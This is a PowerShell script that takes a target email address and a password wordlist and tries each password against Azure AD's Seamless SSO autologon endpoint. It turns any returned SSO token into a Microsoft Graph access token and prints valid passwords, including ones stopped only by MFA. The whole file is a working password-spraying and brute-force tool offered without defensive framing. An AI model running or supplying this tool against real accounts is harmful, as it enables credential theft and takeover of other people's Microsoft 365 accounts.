[string]$username= Read-Host -Prompt "Enter Target Email"
[string]$wordlistPath = Read-Host -Prompt "Path to wordlist"
$wordlist = Get-Content -Path $wordlistPath
foreach ($pass in $wordlist)
{
    $securedValue = ConvertTo-SecureString -AsPlainText -Force -String $pass
    $bstr = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($securedValue)
    $password = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($bstr)
    $requestid = [System.Guid]::NewGuid().guid
    $domain = ($username -split "@")[1]
    Invoke-RestMethod -Method Get -UseBasicParsing ("https://login.microsoftonline.com/common/userrealm/$username" + "?api-version=1.0") -UserAgent $userAgent | Out-Null
    $headers = @{
    "client-request-id"=$requestid
    "return-client-request-id"="true"
    }
    $uri2 = "https://autologon.microsoftazuread-sso.com/$domain/winauth/trust/2005/usernamemixed?client-request-id=$requestid"
    [xml]$data = '<?xml version="1.0" encoding="UTF-8"?>
    <s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://www.w3.org/2005/08/addressing" xmlns:u="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd">
      <s:Header>
        <a:Action s:mustUnderstand="1">http://schemas.xmlsoap.org/ws/2005/02/trust/RST/Issue</a:Action>
        <a:MessageID>urn:uuid:36a6762f-40a9-4279-b4e6-b01c944b5698</a:MessageID>
        <a:ReplyTo>
          <a:Address>http://www.w3.org/2005/08/addressing/anonymous</a:Address>
        </a:ReplyTo>
        <a:To s:mustUnderstand="1">https://autologon.microsoftazuread-sso.com/dewi.onmicrosoft.com/winauth/trust/2005/usernamemixed?client-request-id=30cad7ca-797c-4dba-81f6-8b01f6371013</a:To>
        <o:Security xmlns:o="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd" s:mustUnderstand="1">
          <u:Timestamp u:Id="_0">
            <u:Created>2019-01-02T14:30:02.068Z</u:Created>
            <u:Expires>2019-01-02T14:40:02.068Z</u:Expires>
          </u:Timestamp>
          <o:UsernameToken u:Id="uuid-ec4527b8-bbb0-4cbb-88cf-abe27fe60977">
            <o:Username>DefinedLater</o:Username>
            <o:Password>DefinedLater</o:Password>
          </o:UsernameToken>
        </o:Security>
      </s:Header>
      <s:Body>
        <trust:RequestSecurityToken xmlns:trust="http://schemas.xmlsoap.org/ws/2005/02/trust">
          <wsp:AppliesTo xmlns:wsp="http://schemas.xmlsoap.org/ws/2004/09/policy">
            <a:EndpointReference>
              <a:Address>urn:federation:MicrosoftOnline</a:Address>
            </a:EndpointReference>
          </wsp:AppliesTo>
          <trust:KeyType>http://schemas.xmlsoap.org/ws/2005/05/identity/NoProofKey</trust:KeyType>
          <trust:RequestType>http://schemas.xmlsoap.org/ws/2005/02/trust/Issue</trust:RequestType>
        </trust:RequestSecurityToken>
      </s:Body>
    </s:Envelope>
    '
    [string]$UsernameToken  = [System.Guid]::NewGuid().guid
    [string]$messageId = "urn:uuid:" + ([System.Guid]::NewGuid().guid)
    $data.Envelope.Header.Security.UsernameToken.Id =$UsernameToken
    $data.Envelope.Header.Security.UsernameToken.Username = $username
    $data.Envelope.Header.Security.UsernameToken.Password = $password
    $data.Envelope.Header.MessageID = $messageId
    $data.Envelope.Header.To.'#text'= $uri2
    try {
      $req = Invoke-RestMethod -UseBasicParsing -Uri $uri2 -Method Post -Headers $headers -Body  $data -ContentType "application/soap+xml; charset=utf-8" -UserAgent $userAgent
      $samltoken = $req.Envelope.Body.RequestSecurityTokenResponse.RequestedSecurityToken.Assertion.DesktopSsoToken
      $token ='<saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:1.0:assertion"><DesktopSsoToken>SAMLSSO</DesktopSsoToken></saml:Assertion>' -replace "SAMLSSO", $samltoken
      $bytes = [System.Text.Encoding]::ASCII.GetBytes($token)
      $base64 = [System.Convert]::ToBase64String($bytes);$base64
      $uri3 = "https://login.microsoftonline.com/common/oauth2/token"
      $body =@{
          client_id="cb1056e2-e479-49de-ae31-7812af012ed8"
          resource="https://graph.microsoft.com"
          grant_type="urn:ietf:params:oauth:grant-type:saml1_1-bearer"
          assertion=$base64
          }

      try {

          
        $req = Invoke-RestMethod -UseBasicParsing -Uri $uri3 -Method Post -Headers $headers -ContentType "application/x-www-form-urlencoded" -Body $body
        write-host "statuscode: $req.Exception.Response.StatusCode.value__"
        $headers = @{
            "Authorization" = ($req.token_type) +" "+ ($req.access_token)
            }
            
            $me = Invoke-RestMethod -Uri ($body.resource + "/v1.0/me") -Method Get -Headers $headers; $me
      }
      catch {
        Write-Host "Password Found But login failed (Likely MFA): $pass"
        continue
      }
    }
    catch {
      continue
    }
    Write-Host "Valid Password Found: $pass"
}
